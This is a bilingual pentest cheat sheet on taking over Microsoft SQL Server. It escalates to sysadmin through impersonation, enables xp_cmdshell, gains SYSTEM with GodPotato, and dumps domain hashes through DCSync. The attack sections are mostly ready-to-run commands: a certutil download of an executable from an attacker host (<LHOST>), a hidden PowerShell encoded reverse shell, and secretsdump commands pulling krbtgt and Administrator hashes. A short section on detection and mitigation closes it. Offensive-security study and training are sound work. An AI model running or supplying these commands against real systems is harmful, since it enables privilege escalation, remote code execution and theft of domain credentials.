---
title: MSSQL — from sysadmin to SYSTEM and DCSync
tags: [windows, mssql, xp_cmdshell, godpotato, dcsync, privesc]
---

# MSSQL: execution, SYSTEM and DCSync

**English** | [🇪🇸 Español](mssql-exec.md)

Companion to [MSSQL: credentials and SeBackupPrivilege](mssql-credentials-sebackup.en.md). Here the goal is not reading stored secrets but **running code** from SQL Server and escalating further into the domain.

## 1. Reach sysadmin

```sql
SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.server_principals WHERE type IN ('S','U') AND is_disabled = 0;
```

If you are not sysadmin but hold `IMPERSONATE`:

```sql
EXECUTE AS LOGIN = '<sysadmin_login>';
SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin');
-- ... actions ...
REVERT;
```

## 2. xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /priv';
```

- It runs as the **service account** (`NT Service\MSSQLSERVER` or a domain account), not as your login.
- SQL service accounts usually hold `SeImpersonatePrivilege`: that is where GodPotato comes in.
- Output arrives as text rows; for binaries use PowerShell `-enc` and base64.

## 3. GodPotato (SeImpersonate → SYSTEM)

```sql
EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>/GodPotato-NET4.exe C:\Windows\Temp\gp.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"';
```

Typical output: `nt authority\system`. For a reverse shell:

```text
C:\Windows\Temp\gp.exe -cmd "cmd /c powershell -nop -w hidden -enc <BASE64>"
```

Alternatives: `PrintSpoofer`, `JuicyPotatoNG` depending on Windows version and available privileges. GodPotato works on Windows Server 2019/2022 and Windows 10/11.

## 4. DCSync with the compromised account

If SYSTEM is on a DC or you obtain credentials of an account with `DS-Replication-Get-Changes`:

```bash
impacket-secretsdump -just-dc-user '<user>' '<domain>/<user>@<DC_IP>' -hashes ':<NT_HASH>'
impacket-secretsdump -just-dc-user 'krbtgt' '<domain>/<user>@<DC_IP>' -hashes ':<NT_HASH>'
```

With a `ccache`:

```bash
export KRB5CCNAME='<user>.ccache'
impacket-secretsdump -k -no-pass -just-dc-user 'Administrator' '<domain>/<user>@<dc>.<domain>'
```

## 5. Typical errors

- **`SQL Server blocked access to procedure 'xp_cmdshell'`** → disabled or no `CONTROL SERVER`; re-enable it as sysadmin.
- **`The EXECUTE permission was denied`** → the login lacks `EXECUTE` on the procedure; use impersonation.
- **`Access is denied` from GodPotato** → missing `SeImpersonatePrivilege` (service virtual account) or wrong-architecture binary.
- **`-enc` too long** → split the command or upload a `.ps1`.
- **`rpc_s_access_denied` in secretsdump** → the account lacks replication rights; look for `DS-Replication-Get-Changes-All`.
- **`KRB_AP_ERR_SKEW`** → clock; see [clock and Kerberos](../general/kerberos-clock.en.md).

## 6. Detection and mitigation

- **15457** (`xp_cmdshell` changed) and **4688** with `cmd.exe`/`powershell.exe` as children of `sqlservr.exe`.
- **4662** with `DS-Replication-Get-Changes` from a non-DC account.
- `*Potato*` processes in `C:\Windows\Temp` and `certutil` downloads.
- Disable `xp_cmdshell` and `OLE Automation`; run SQL Server with virtual accounts and no explicit `SeImpersonate`.
- Remove replication rights from non-DC accounts and audit `sys.server_permissions`.

MITRE: T1059.003, T1134.001, T1003.006.
